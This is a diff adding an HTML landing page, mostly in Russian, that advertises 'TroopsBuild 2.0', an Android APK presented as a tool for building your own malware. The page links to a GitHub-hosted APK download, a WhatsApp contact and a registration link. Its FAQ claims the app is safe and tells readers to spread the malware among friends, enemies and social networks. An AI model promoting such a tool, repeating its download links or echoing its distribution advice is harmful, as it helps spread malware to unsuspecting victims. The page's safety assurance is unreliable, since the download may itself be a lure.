@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+
+<html>
+
+	<head>		<meta charset="utf-8">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<meta name="description" content="Название вредоносного ПО, загрузка, общая информация о вирусе. Gen:Variant.Johnnie.97338, Download Gen:Variant., Build Malware, Apk вирус, TroopsBuild">
+
+		<meta name="keywords" content="TroopsBuild">
+
+		<meta name="author" content="zl">
+
+		<title>TroopsBuild 2.0</title>
+
+		<link href="q.css" rel="stylesheet" />
+
+		<link href="w.css" rel="stylesheet" type="text/css" />
+
+		<link href="e.css" rel="stylesheet" type="text/css" />
+
+		<link href="r.css" rel="stylesheet" type="text/css" />
+
+		<script src="z.js"></script>
+
+		<script src="x.js"></script>
+
+		<script src="ru/sia/"></script>
+
+		<script src="ru/sia/popper.min.js"></script>
+
+		<script src="ru/sia/bootstrap.min.js"></script>
+
+		<script src="ru/sia/waves.js"></script>
+
+		<script src="ru/sia/jquery.slimscroll.js"></script>
+
+		<script src="ru/sia/morris.min.js"></script>
+
+		<script src="ru/sia/"></script>
+
+		<style type="text/css">.hide{display:none!important}.show{display:block!important}</style>
+
+		<script type="text/javascript">
+
+        function modal_open(type, url) {
+
+			$('#modal').modal('show');
+
+			if (type == 'add') {
+
+				$('#modal-title').html('<i class="fa fa-plus-square"></i> Tambah Data');
+
+			} else if (type == 'edit') {
+
+				$('#modal-title').html('<i class="fa fa-edit"></i> Ubah Data');
+
+			} else if (type == 'delete') {
+
+				$('#modal-title').html('<i class="fa fa-trash"></i> Hapus Data');
+
+			} else if (type == 'detail') {
+
+				$('#modal-title').html('<i class="fa fa-search"></i> Detail Data');
+
+			} else {
+
+				$('#modal-title').html('Empty');
+
+			}
+
+        	$.ajax({
+
+        		type: "GET",
+
+        		url: url,
+
+        		beforeSend: function() {
+
+        			$('#modal-detail-body').html('Sedang memuat...');
+
+        		},
+
+        		success: function(result) {
+
+        			$('#modal-detail-body').html(result);
+
+        		},
+
+        		error: function() {
+
+        			$('#modal-detail-body').html('Terjadi kesalahan.');
+
+        		}
+
+        	});
+
+        	$('#modal-detail').modal();
+
+        }
+
+    	</script>
+
+	</head>
+
+	<body>
+
+	<header id="topnav">
+
+			<div class="topbar-main">
+
+				<div class="container-fluid">
+
+					<div class="logo">
+
+						<a href="" class="logo">
+
+							<span class="logo-small"><i class="fa fa-globe"></i></span>
+
+							<span class="logo-large"><i class="fa fa-globe"></i> TroopsBuild</span>
+
+						</a>
+
+					</div>
+
+					<div class="menu-extras topbar-custom">
+
+						<ul class="list-unstyled topbar-right-menu float-right mb-0">
+
+							<li class="menu-item">
+
+								<a class="navbar-toggle nav-link">
+
+									<div class="lines">
+
+										<span></span>
+
+										<span></span>
+
+										<span></span>
+
+									</div>
+
+								</a>
+
+							</li>
+
+													</ul>
+
+					</div>
+
+					<div class="clearfix"></div>
+
+				</div>
+
+			</div>
+
+			<div class="navbar-custom">
+
+				<div class="container-fluid">
+
+					<div id="navigation">
+
+						<ul class="navigation-menu">
+
+														<li>
+
+									
+
+								<li class="has-submenu">
+
+	
+
+									<ul class="submenu">
+
+										
+
+								</li>
+
+                        </ul>
+
+					</div>
+
+				</div>
+
+			</div>
+
+		</header>
+
+        <div class="wrapper">
+
+			<div class="container-fluid" style="padding-top: 30px;">
+
+			<div class="modal fade" id="modal" id="modal-detail" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true" style="display: none;">
+
+				<div class="modal-dialog modal-dialog-centered modal-lg">
+
+					<div class="modal-content">
+
+						<div class="modal-header">
+
+							<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+
+							<h4 class="modal-title" id="modal-title"></h4>
+
+						</div>
+
+						<div class="modal-body" id="modal-detail-body">
+
+						</div>
+
+						<div class="modal-footer">
+
+							<button type="button" class="btn btn-light" data-dismiss="modal">Tutup</button>
+
+						</div>
+
+					</div>
+
+				</div>
+
+			</div>
+
+						<div class="row">
+
+							<div class="col-lg-12">
+
+							</div>
+
+						</div>
+
+				<div class="row">
+
+					<div class="col-lg-12">
+
+		                <div class="card-box">
+
+                                <center>
+
+                                    <i class="fa fa-question text-green" style="font-size: 40px;"></i>
+
+            	                    <h4 class="text-uppercase">TroopsBuild 2022</h4>
+
+            					    <p>Создайте собственное вредоносное ПО с помощью приложения TroopsBuild, которое можно бесплатно загрузить отсюда.
+
+            					    </p>
+
+            						<a href="https://github.com/troopsbuild/download_ed1/blob/main/TroopsBuild.apk?raw=true" class="btn btn-success"><i class=""></i> Загрузки</a> 
+
+            						<a href="https://wa.me/message/RW644F3WS43PI1" class="btn btn-warning"><i class=""></i> Свяжитесь с нами</a>
+
+            				    </center>	
+
+            			</div>
+
+            		</div>
+
+            		<div class="col-lg-12">
+
+						<div class="card-box">
+
+							<div class="facts-box text-center">
+
+								<div class="row">
+
+									<div class="col-lg-4">
+
+										<h2>200+</h2>
+
+										<p class="text-muted">Всего загрузок</p>
+
+									</div>
+
+									<div class="col-lg-4">
+
+										<h2>80+</h2>
+
+										<p class="text-muted">Посетитель сегодня</p>
+
+									</div>
+
+                    </div>
+
+				</div>
+
+				<div class="card-box">
+
+				<div class="row">
+
+                    <div class="col-lg-5 offset-lg-1">
+
+                        <div>
+
+                            <div class="question-q-box">Q.</div>
+
+                            <h4 class="question" data-wow-delay=".1s">Безопасно ли приложение TroopsBuild?</h4>
+
+                            <p class="answer">Приложение Malware Maker, да, это приложение TroopsBuild, его безопасно использовать, вы можете безопасно его скачать</div>
+
+                        <div>
+
+                            <div class="question-q-box">Q.</div>
+
+                            <h4 class="question">Как использовать строить войска?</h4>
+
+                            <p class="answer">Вам просто нужно скачать приложение TroopsBuild (<a href="https://jasasosmed.mirpedia.skom.id/auth/register.php">Здесь</a>).После этого вы открываете и выбираете вредоносное ПО, которое хотите использовать.</p>
+
+                        </div>
+
+                    </div>
+
+                    <div class="col-lg-5">
+
+                        <div>
+
+                            <div class="question-q-box">Q.</div>
+
+                            <h4 class="question">Как распространять вредоносное ПО?</h4>
+
+                            <p class="answer">Это действительно просто, распространять вредоносное ПО очень просто, вам нужно только распространить его среди друзей, врагов или в социальных сетях.</p>
+
+                        </div>
+
+                        <div>
+
+                            
+
+				</div>
+
+					</div>
+
+				</div>
+
+				<footer class="footer">
+
+					<div class="container">
+
+						<div class="row">
+
+							<div class="col-12 text-center">
+
+								Copyright &copy; 2022<i class=""></i> by <a>Levinton. All Rights Reserved</a>
+
+							</div>
+
+						</div>
+
+					</div>
+
+				</footer>
+
+			</div>
+
+		</div>
+
+		
+
+		<script src="ru/sia/jquery.core.js"></script>
+
+		<script src="ru/sia/jquery.app.js"></script>
+
+	</body>
+
+</html>
